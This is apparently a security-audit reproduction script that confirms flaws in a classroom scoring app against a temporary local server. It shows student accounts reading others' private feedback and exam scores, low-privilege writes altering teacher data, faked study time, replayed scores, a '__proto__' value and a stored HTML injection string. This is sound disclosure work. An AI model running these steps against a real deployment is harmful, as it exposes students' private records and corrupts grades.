"""Bounded audit reproduction against an isolated temporary server. No live writes.
Run from any directory: python3 /absolute/path/to/reproduce.py
Assertions document vulnerable behavior; these are NOT security regression passes.
"""
import copy
import importlib.util
import json
from pathlib import Path
import subprocess

ROOT = Path(__file__).resolve().parents[2]
spec = importlib.util.spec_from_file_location('security_fixture', ROOT/'tests/test_security.py')
fixture = importlib.util.module_from_spec(spec)
spec.loader.exec_module(fixture)
T = fixture.SecurityTests
results = []

def record(name, **evidence):
    results.append({'finding': name, **evidence})

T.setUpClass()
try:
    t = T()
    teacher, tc = t.login()
    student, sc = t.login('student', 'personal')
    rep, rc = t.login('representative', 'personal')
    room, cc = t.login('teacher', 'classroom')

    body = t.payload(teacher, 'teacher')
    body['payload']['master']['exams'] = [{'id': 'private-exam', 'scores': {'other-student': {'physics': 68}}}]
    body['payload']['shared']['studentFeedbacks'] = [{'id': 'private-feedback', 'name': 'other-student', 'text': 'PRIVATE_AUDIT_MARKER', 'read': False}]
    body['payload']['shared']['nominations'] = [{'id': 'private-nomination', 'sid': 's2', 'what': 'PRIVATE_APPLICATION_MARKER', 'status': 'pending'}]
    body['payload']['shared']['prizes'] = [{'id': 'p1', 'name': 'test prize', 'cost': 10, 'active': False}]
    assert t.request('/api/sync', body, teacher, tc)[0] == 200
    status, data = t.request('/api/sync', opener=student)
    visible = data['slots']['authoritative']['payload']
    assert status == 200 and visible['shared']['studentFeedbacks'][0]['text'] == 'PRIVATE_AUDIT_MARKER'
    assert visible['shared']['nominations'][0]['sid'] == 's2' and visible['master']['exams']
    status, html = t.request('/', opener=student)
    assert status == 200 and 'PRIVATE_AUDIT_MARKER' in html
    assert 'EMBEDDED_EXAMS' in html
    record('unfiltered student reads', sync_status=200, bootstrap_contains_other_feedback=True, other_exam_and_application_visible=True)

    body = t.payload(room, 'classroom')
    body['payload']['shared']['studentFeedbacks'] = []
    body['payload']['shared']['prizes'][0]['cost'] = -100
    body['payload']['shared']['nominations'][0]['status'] = 'approved'
    assert t.request('/api/sync', body, room, cc)[0] == 200
    data = t.payload(teacher, 'teacher')['payload']['shared']
    assert not data['studentFeedbacks'] and data['prizes'][0]['cost'] == -100 and data['nominations'][0]['status'] == 'approved'
    record('classroom overwrites teacher-only shared data', sync_status=200, feedback_deleted=True, prize_cost_changed=True, application_status_changed=True)

    body = t.payload(student, 'personal')
    body['payload']['shared']['studyLog'] += [
        {'id': f'fake-study-{n}', 'sid': 's1', 'date': '2026-10-28', 'dur': 1440, 'startTs': 0, 'endTs': 1}
        for n in range(2)
    ]
    assert t.request('/api/sync', body, student, sc)[0] == 200
    saved = t.payload(student, 'personal')['payload']['shared']['studyLog']
    assert sum(x['dur'] for x in saved if x['sid'] == 's1') == 2880
    record('unverified learning duration', sync_status=200, minutes_on_one_day=2880)

    body = t.payload(rep, 'personal')
    body['payload']['shared']['records'] += [
        {'id': f'replay-{n}', 'studentId': 's2', 'weekKey': '2020-W01', 'date': '2020-01-01', 'type': 'bonus', 'amount': 1, 'cat': '作业', 'batchId': 'same-assignment', 'reason': 'same assignment'}
        for n in range(3)
    ]
    assert t.request('/api/sync', body, rep, rc)[0] == 200
    saved = t.payload(rep, 'personal')['payload']['shared']['records']
    assert sum(x['amount'] for x in saved if x['weekKey'] == '2020-W01') == 3
    record('duplicate and backdated scoring', sync_status=200, same_assignment_accepted=3, arbitrary_week_persisted=True)

    body = t.payload(rep, 'personal')
    poison = {'id': 'poison', 'studentId': 's1', 'weekKey': 'audit-week', 'type': 'bonus', 'amount': 1, 'cat': '作业', 'batchId': '__proto__'}
    injected = {**poison, 'id': 'html-record', 'batchId': '\"><b id="audit-injected">AUDIT</b><span data-x="'}
    body['payload']['shared']['records'] += [poison, injected]
    assert t.request('/api/sync', body, rep, rc)[0] == 200
    saved = t.payload(teacher, 'teacher')['payload']['shared']['records']
    # Execute the actual rendering function with harmless dependencies stubbed.
    js = r'''
const fs=require('fs'), vm=require('vm');
const input=JSON.parse(fs.readFileSync(0,'utf8'));
const source=fs.readFileSync(input.root+'/index.html','utf8');
const start=source.indexOf('function viewScoreTeacherOrClubUI(){');
const end=source.indexOf('function bindScore(){',start);
const ctx={state:{settings:{baseScore:5},groupCount:0,students:[]},currentWeekKey:()=> 'audit-week',weekCN:x=>x,isClassroom:()=>false,weekRecords:()=>input.records,studentById:()=>null,esc:x=>String(x??'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])),ROOM_SCORE_NAMES:[]};
vm.createContext(ctx);vm.runInContext(source.slice(start,end),ctx);
let error='';try{ctx.viewScoreTeacherOrClubUI()}catch(e){error=String(e)}
if(!error.includes('TypeError'))throw Error('Expected render failure');
ctx.weekRecords=()=>input.records.filter(x=>x.id==='html-record');
if(!ctx.viewScoreTeacherOrClubUI().includes('<b id="audit-injected">AUDIT</b>'))throw Error('Expected raw HTML');
console.log(JSON.stringify({render_error:error,raw_html_inserted:true}));
'''
    rendered = subprocess.run(['node', '-e', js], input=json.dumps({'root': str(ROOT), 'records': saved}), text=True, capture_output=True, check=True)
    record('stored rendering denial and HTML injection', sync_status=200, **json.loads(rendered.stdout))

    before = sum(p.stat().st_size for p in (t.private/'backups').glob('*.json'))
    body = t.payload(student, 'personal')
    body['payload']['shared']['studentFeedbacks'].append({'id': 'large-feedback', 'name': '普通学生', 'text': 'A'*499000, 'read': False})
    assert t.request('/api/sync', body, student, sc)[0] == 200
    for n in range(2):
        body = t.payload(student, 'personal')
        body['payload']['shared']['studentFeedbacks'].append({'id': f'small-feedback-{n}', 'name': '普通学生', 'text': 'x', 'read': False})
        assert t.request('/api/sync', body, student, sc)[0] == 200
    growth = sum(p.stat().st_size for p in (t.private/'backups').glob('*.json')) - before
    assert growth > 990000
    record('backup storage amplification', accepted_writes=3, backup_growth_bytes=growth, temporary_data_only=True)
finally:
    T.tearDownClass()

print(json.dumps({'scope': 'temporary localhost fixture only', 'confirmed': results}, ensure_ascii=False, indent=2))
